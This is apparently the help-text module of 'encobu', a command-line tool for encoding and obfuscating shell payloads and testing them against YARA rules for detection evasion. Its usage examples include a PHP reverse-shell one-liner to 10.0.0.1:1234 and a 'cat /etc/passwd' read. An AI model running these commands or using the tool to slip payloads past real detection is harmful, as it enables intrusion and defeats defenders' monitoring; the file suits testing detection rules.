class MainCommand:
    DESCRIPTION = "A modern cli tool for encoding and obfuscating your payloads and testing them against simple firewall rules."
    EPILOG = """
    EXAMPLES:
        encobu encode [OPTIONS]
        encobu obfus [OPTIONS]
        encobu decode [OPTIONS]
        encobu test [OPTIONS]
        encobu report [OPTIONS]
    """
    SUB_PARSER_TITLE = "Modes"
    SUB_PARSER_METAVAR = "<COMMAND>"


class EncodeSubCommand:
    DESCRIPTION = "Encodes a given payload using standard encoding methods."
    HELP = "Encode a string of text using specific algorithm."
    EPILOG = """
    EXAMPLES:
        BASIC ENCODING
        encobu encode -P "ls -al" -m xor -k pizzatime 
        encobu encode -P "echo $SHELL" -m b64
        encobu encode -P whoami -m rot13

        ADVANCED ENCODING
        encobu encode -P "ls -al" -m b64-rot13 [Base64 + ROT13 Encoding]
        encobu encode -P "echo $SHELL" -m xor-b64-rot13 -k secret [XOR + Base64 + ROT13 Encoding]
    """

    PAYLOAD_HELP = "The payload you want to encode using different methods."
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to encode using different methods."
    FILE_METAVAR = "<FILE>"

    METHOD_HELP = "The encoding algorithm to use (choices: %(choices)s)."
    METHOD_METAVAR = "<METHOD>"

    KEY_HELP = "The encryption key is required when the method is XOR."
    KEY_METAVAR = "<SECRET_KEY>"


class ObfusSubCommand:
    DESCRIPTION = (
        "Obfuscates the payload using string manipulation and obfuscation algorithms."
    )
    HELP = "Obfuscate your payload using specific algorithms."
    EPILOG = """
    EXAMPLES:
        1. Random Character Insertion (RCI)
           encobu obfus -P "whoami" -a rci -s 2 -n 2
           encobu obfus -F script.sh -a rci --stride 3 --noise-length 1

        2. Split and Concatenate (SAC)
           encobu obfus -P "cat /etc/passwd" -a sac -s 3 -c "."
           encobu obfus -F payload.txt -a sac --concat-operator "+"

        3. Reversible Transformation / Atbash (RIT)
           encobu obfus -P "id" -a rit
           encobu obfus -F hack.txt -a rit

        4. Escape Sequence Obfuscation (ESO)
           encobu obfus -P "echo $USER" -a eso -e hex
           encobu obfus -P "ls -al" -a eso -e octal -p  [Polymorphic Octal]
    """

    PAYLOAD_HELP = "The payload you want to obfuscate using different algorithms."
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to obfuscate using different algorithms."
    FILE_METAVAR = "<FILE>"

    ALGO_HELP = "The obfuscation algorithm to use (choices: %(choices)s)."
    ALGO_METAVAR = "<ALGORITHM>"

    STRIDE_HELP = (
        "Step size for character insertion or splitting (default: %(default)s)."
    )
    STRIDE_METAVAR = "<STRIDE>"

    NOISE_LEN_HELP = "Number of random characters to insert (default: %(default)s)."
    NOISE_LEN_METAVAR = "<NOISE_LENGTH>"

    OPERATOR_HELP = (
        "Concatenation operator to be used with SAC algorithm (default: %(default)s)."
    )
    OPERATOR_METAVAR = "<OPERATOR>"

    ESCAPE_TYPE_HELP = (
        "Escape sequence format to use (default: %(default)s) (choices: %(choices)s)."
    )
    ESCAPE_TYPE_METAVAR = "<ESCAPE_TYPE>"

    POLY_HELP = "Enables polymorphic escaping for the ESO algorithm."


class DecodingSubCommand:
    DESCRIPTION = "Decodes a given payload or a file using standard decoding methods."
    HELP = "Decodes a given payload or file using specified method."
    EPILOG = """
        EXAMPLES:
            encobu decode -P "bHMgLWFs" -m b64
            encobu decode -F decode.txt -m b64-rot13
            encobu decode -P "BQRBQxUc" -m xor -k iwantpizza

            ADVANCED METHODS:
                encobu decode -P "oUZtYJSf" -m b64-rot13
                encobu decode -P "ODEODkHp" -m xor-b64-rot13 -k iwantpizza
    """
    PAYLOAD_HELP = "The payload you want to decode using different methods."
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to decode using different methods."
    FILE_METAVAR = "<FILE>"

    METHOD_HELP = "The decoding algorithm to use (choices: %(choices)s)."
    METHOD_METAVAR = "<METHOD>"

    KEY_HELP = "The encryption key is required when the method is XOR."
    KEY_METAVAR = "<SECRET_KEY>"


class DeobfusSubCommand:
    DESCRIPTION = "De-obfuscates the payload using string manipulation and de-obfuscation algorithms."
    HELP = "De-obfuscate your payload using specific algorithms."
    EPILOG = """
    EXAMPLES:
        1. Reverse Random Character Insertion (RCI)
           encobu deobfus -P "whXXoaYYmi" -a rci -s 2 -n 2
           encobu deobfus -F obf_script.txt -a rci --stride 3 --noise-length 1

        2. Reverse Split and Concatenate (SAC)
           encobu deobfus -P '"cat" . " /e" . "tc/" . "pas" . "swd"' -a sac -c "."
           encobu deobfus -F glued_payload.txt -a sac

        3. Reverse Transformation / Atbash (RIT)
           encobu deobfus -P "rw" -a rit
           encobu deobfus -F transformed.txt -a rit

        4. Reverse Escape Sequence Obfuscation (ESO)
           encobu deobfus -P "\\x65\\x63\\x68\\x6f" -a eso
           encobu deobfus -F escaped_payload.txt -a eso
    """

    PAYLOAD_HELP = "The payload you want to de-obfuscate using different algorithms."
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to de-obfuscate using different algorithms."
    FILE_METAVAR = "<FILE>"

    ALGO_HELP = "The de-obfuscation algorithm to use (choices: %(choices)s)."
    ALGO_METAVAR = "<ALGORITHM>"

    STRIDE_HELP = (
        "Step size used during the original obfuscation (default: %(default)s)."
    )
    STRIDE_METAVAR = "<STRIDE>"

    NOISE_LEN_HELP = "Number of characters inserted during the original obfuscation (default: %(default)s)."
    NOISE_LEN_METAVAR = "<NOISE_LENGTH>"

    OPERATOR_HELP = "Concatenation operator used during the original SAC obfuscation (default: %(default)s)."
    OPERATOR_METAVAR = "<OPERATOR>"


class TestSubCommand:
    DESCRIPTION = "Test different payloads against yara static rules."
    HELP = "Use this command to test the effectiveness of different encoded and obfuscated payloads against simple yara static rules."
    EPILOG = """
    EXAMPLES:
        encobu test -P "php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -r reverse_shell.yara
        encobu test -F hack.txt -r commands.yara
    """

    PAYLOAD_HELP = "The payload you want to test against different yara rules."
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to test against different yara rules."
    FILE_METAVAR = "<FILE>"

    RULES_HELP = "YARA rule to test against different payloads."
    RULES_METAVAR = "<RULE>"

    OUTPUT_DIR_HELP = "Path to create the output directory (default: %(default)s)."
    OUTPUT_DIR_METAVAR = "<OUTPUT_DIR>"

    ADD_RULES_HELP = "Path to syntactically correct YARA rule file."
    ADD_RULES_METAVAR = "<ADD_RULE>"


class ReportSubCommand:
    DESCRIPTION = "Aggregates and analyzes YARA scan results to provide structured summaries and actionable evasion insights."
    HELP = "Generate a summary or a comparative evasion report from JSON scan results."
    EPILOG = """
    EXAMPLES:
        SUMMARY MODE:
        encobu report -s test_results/inline_a1b2c3d4_results.json
        encobu report -s test_results/
        encobu report -s payload1.json payload2.json payload3.json

        COMPARISON MODE:
        encobu report -o original_results.json -m modified_results.json
    """

    SUMMARY_HELP = "Path to one or more JSON report files, or a directory containing JSON reports, to generate a summary table."
    SUMMARY_METAVAR = "<FILE_OR_DIR>"

    ORIGINAL_HELP = "Path to the original payload's JSON report file, acting as the baseline for comparison."
    ORIGINAL_METAVAR = "<ORIGINAL_JSON>"

    MODIFIED_HELP = "Path to the modified payload's JSON report file to compare against the baseline."
    MODIFIED_METAVAR = "<MODIFIED_JSON>"
